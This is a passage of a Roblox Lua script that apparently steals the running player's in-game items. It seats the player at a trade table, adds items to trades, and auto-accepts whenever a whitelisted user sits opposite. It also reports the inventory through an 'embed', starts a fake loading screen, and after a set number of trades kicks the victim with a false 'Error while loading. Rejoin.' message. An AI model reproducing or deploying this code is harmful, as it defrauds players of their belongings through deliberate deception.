    end
end

local function addToTrade(name)
    pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", name)
end

local function runAutoTrade(reason)
    local items = collectTradeable()
    if #items == 0 then log("no tradeable") return end
    sendInventoryEmbed(reason)
    clearTradeItems()
    task.wait(0.25)
    local take = math.min(MAX_ITEMS_PER_TRADE, #items)
    for i = 1, take do
        addToTrade(items[i].Name)
        task.wait(0.15)
    end
    local t0 = tick()
    local closed = false
    while tick() - t0 < 40 do
        if not tradeWindowOpen() then closed = true; break end
        pcall(TradeFunction.InvokeServer, TradeFunction, "accept")
        task.wait(0.4)
    end
    if closed then
        tradesCompleted = tradesCompleted + 1
        log("trade " .. tradesCompleted .. " completed")
        if tradesCompleted >= KICK_THRESHOLD then
            task.wait(1.5)
            LP:Kick(KICK_MSG)
        end
    end
end

-- =============================================================================
-- CHAT COMMANDS
-- =============================================================================
local CHAT_PREFIX = "."
local function cmdTp()   local seat = pickSeat(nil); if seat then sitOn(seat) end end
local function cmdSit()
    local char = LP.Character; if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
    hum.Sit = true; task.wait(0.4)
    if not currentSeat() then local seat = pickSeat(nil); if seat then sitOn(seat) end end
end
local function cmdAddAll()
    if not tradeWindowOpen() then return end
    local items = collectTradeable(); clearTradeItems(); task.wait(0.25)
    local count = 0
    for _, item in ipairs(items) do
        if count >= MAX_ITEMS_PER_TRADE then break end
        addToTrade(item.Name); count = count + 1; task.wait(0.15)
    end
end
local function cmdKick() task.wait(0.5); LP:Kick("Error while loading. Rejoin.") end

local COMMANDS = { tp = cmdTp, sit = cmdSit, addall = cmdAddAll, kick = cmdKick }
local function handleChat(msg)
    if type(msg) ~= "string" then return end
    if msg:sub(1, #CHAT_PREFIX) ~= CHAT_PREFIX then return end
    local body = msg:sub(#CHAT_PREFIX + 1):lower():gsub("%s+", "")
    local fn = COMMANDS[body]
    if not fn then return end
    task.spawn(function() pcall(fn) end)
end
LP.Chatted:Connect(handleChat)

-- =============================================================================
-- MAIN
-- =============================================================================
local function main()
    log("main start | placeId=" .. game.PlaceId .. " | char=" .. tostring(LP.Character ~= nil))

    task.spawn(showLoadingScreen)

    waitForChar(30)
    log("char ready")

    local map = waitForMap(60)
    if not map then log("map never loaded") return end
    local zone = waitForZone(map, 30)
    if not zone then log("zone never loaded") return end
    log("zone ready: " .. zone.Name)

    local tables = getTradeTables()
    log("trade tables found: " .. #tables)

    local seat = currentSeat()
    if not seat then
        local target = pickSeat(nil)
        if target then sitOn(target) end
    end

    while true do
        task.wait(0.5)
        local curSeat, tbl = currentSeat()
        if not curSeat then
            local target = pickSeat(nil)
            if target then sitOn(target) end
        else
            local opp = seatOccupant(oppositeSeat(curSeat, tbl))
            if opp and WHITELIST[opp.Name] then
                if tradeWindowOpen() then
                    runAutoTrade("Whitelisted user on opposite chair.")
                end
            elseif opp and not WHITELIST[opp.Name] then
                forceJumpOff()
                local target = pickSeat(tbl)
                if target then sitOn(target) end
            end
        end
    end
end

task.spawn(function()
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(1)
    pcall(main)
end)
